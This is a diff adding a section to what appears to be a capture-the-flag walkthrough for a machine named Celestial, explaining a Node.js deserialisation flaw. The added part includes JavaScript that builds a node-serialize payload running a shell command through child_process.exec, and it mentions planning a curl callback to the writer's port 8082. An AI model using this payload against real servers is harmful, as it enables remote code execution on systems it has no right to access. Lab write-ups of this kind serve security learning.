@@ -67,4 +67,21 @@ eyJ1c2VybmFtZSI6IkNsZXZlciIsImNvdW50cnkiOiJUaGVCZXN0IiwiY2l0eSI6IkJhcmNlbG9uYSIs
 
 ![3](../../../assets/images/Celestial/3.png) 
 
+We have been able! The server has interpreted the serialized data that we have sent it without any control. So if we build a malicious payload we can try to execute commands on the system.
+
+## Crafting a Malicious Serialized Payload:
+
+To probe our theory, we are going to craft a payload to receive a curl from the victim machine in a localhost server hosted in our port 8082.
+
+To do this we will use the following data serializer that we have taken from the following website -> https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+
+```js
+var y = {
+ rce : function(){
+ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+ },
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+```
 
